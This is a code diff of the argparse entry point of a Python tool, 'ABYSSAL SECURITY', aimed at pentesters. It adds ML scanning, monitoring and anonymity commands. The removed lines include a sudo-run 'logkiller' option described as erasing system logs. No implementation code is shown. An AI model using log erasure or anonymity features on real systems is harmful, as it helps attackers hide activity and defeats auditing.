-    parser.add_argument('--harden', action='store_true', help='System hardening')
-    parser.add_argument('--full', action='store_true', help='Run all modules')
-    parser.add_argument('--logkiller', action='store_true', help='Erase system logs')
-    parser.add_argument('--antimitm', action='store_true', help='Run anti-MITM checks')
+    """Main application entry point"""
+    app = AbyssalSecurity()
+    
+    parser = argparse.ArgumentParser(description="ABYSSAL SECURITY - AI/ML Security Framework")
+    parser.add_argument('--interactive', action='store_true', help='Interactive AI/ML security control panel')
+    parser.add_argument('--ml-scan', action='store_true', help='Run ML comprehensive scan')
+    parser.add_argument('--ml-monitor', action='store_true', help='Start ML real-time monitoring')
+    parser.add_argument('--anon', action='store_true', help='Activate anonymity mode')
+    parser.add_argument('--check-anon', action='store_true', help='Check anonymity status')
+    parser.add_argument('--restore', action='store_true', help='Restore original identity')
+    parser.add_argument('--retrain', action='store_true', help='Retrain ML models')
+    parser.add_argument('--config', action='store_true', help='Configure ML settings')
+    
     args = parser.parse_args()
-
-    if args.control:
-        feature_menu()
+    
+    if args.interactive:
+        app.interactive_mode()
+    elif args.ml_scan:
+        app.run_ml_comprehensive_scan()
+    elif args.ml_monitor:
+        app.ml_real_time_monitor()
     elif args.anon:
-        if get_feature_state('anon') == 'on':
-            anon_mode()
-        else:
-            print("❌ ANON feature is disabled. Use --control to enable it.")
-    elif args.scan:
-        if get_feature_state('scan') == 'on':
-            scan_mode()
-        else:
-            print("❌ SCAN feature is disabled. Use --control to enable it.")
-    elif args.fix:
-        if get_feature_state('fix') == 'on':
-            run_with_sudo(fix_mode, 'fix_mode')
-        else:
-            print("❌ FIX feature is disabled. Use --control to enable it.")
-    elif args.interactive:
-        if get_feature_state('interactive') == 'on':
-            interactive_mode()
-        else:
-            print("❌ INTERACTIVE feature is disabled. Use --control to enable it.")
-    elif args.live:
-        if get_feature_state('live') == 'on':
-            start_live_monitoring()
-        else:
-            print("❌ LIVE feature is disabled. Use --control to enable it.")
-    elif args.live_on:
-        enable_live_startup()
-    elif args.live_off:
-        disable_live_startup()
-    elif args.startup:
-        startup_menu()
-    elif args.harden:
-        if get_feature_state('harden') == 'on':
-            run_with_sudo(harden_mode, 'harden_mode')
-        else:
-            print("❌ HARDEN feature is disabled. Use --control to enable it.")
-    elif args.full:
-        if get_feature_state('full') == 'on':
-            full_mode()
-        else:
-            print("❌ FULL feature is disabled. Use --control to enable it.")
-    elif args.logkiller:
-        if get_feature_state('logkiller') == 'on':
-            run_with_sudo(logkiller_mode, 'logkiller_mode')
-        else:
-            print("❌ LOGKILLER feature is disabled. Use --control to enable it.")
-    elif args.antimitm:
-        if get_feature_state('antimitm') == 'on':
-            run_with_sudo(antimitm_mode, 'antimitm_mode')
-        else:
-            print("❌ ANTIMITM feature is disabled. Use --control to enable it.")
+        app.run_anonymity_mode()
+    elif args.check_anon:
+        app.check_anonymity_status()
+    elif args.restore:
+        app.restore_identity()
+    elif args.retrain:
+        app.retrain_ml_models()
+    elif args.config:
+        app.configure_ml_settings()
     else:
-        pass
+        app.show_banner()
+        print("🤖 ABYSSAL SECURITY - AI/ML Security Framework")
+        print("\n🔥 ALL AVAILABLE COMMANDS:")
+        print("┌─────────────────────────────────────────────────────────────────┐")
+        print("│  🤖 AI/ML COMMANDS:                                           │")
+        print("│  python3 abyssal.py --interactive    # Full AI/ML control panel │")
+        print("│  python3 abyssal.py --ml-monitor     # Real-time ML monitoring  │")
+        print("│  python3 abyssal.py --ml-scan        # ML comprehensive scan   │")
+        print("│  python3 abyssal.py --retrain        # Retrain ML models       │")
+        print("│  python3 abyssal.py --config         # Configure ML settings   │")
+        print("│                                                               │")
+        print("│  👤 ANONYMITY MODE:                                           │")
+        print("│  python3 abyssal.py --anon           # Activate anonymity mode │")
+        print("│  python3 abyssal.py --check-anon     # Check anonymity status  │")
+        print("│  python3 abyssal.py --restore        # Restore identity        │")
+        print("│                                                               │")
+        print("│  🎮 INTERACTIVE MODE OPTIONS:                                │")
+        print("│  1️⃣ 🤖 ML Real-time Monitor    # AI-powered monitoring          │")
+        print("│  2️⃣ 🧠 ML Comprehensive Scan  # Full ML analysis               │")
+        print("│  3️⃣ 📁 ML File Analysis      # ML file anomaly detection       │")
+        print("│  4️⃣ 🔧 ML Process Analysis   # ML process behavior analysis    │")
+        print("│  5️⃣ 🌐 ML Network Analysis  # ML network anomaly detection    │")
+        print("│  6️⃣ 👤 Anonymity Mode        # Complete identity protection    │")
+        print("│  7️⃣ 🔧 Retrain Models       # Retrain ML models                │")
+        print("│  8️⃣ ⚙️ ML Configuration      # Configure ML settings            │")
+        print("│  9️⃣ 📊 Model Statistics     # Show ML model info               │")
+        print("└─────────────────────────────────────────────────────────────────┘")
+        print("\n🚀 QUICK START: python3 abyssal.py --interactive")
+        print("🔥 PERFECT FOR PENTESTERS - STAY ANONYMOUS, STAY SECURE! 🔥")
 
 if __name__ == "__main__":
     main()
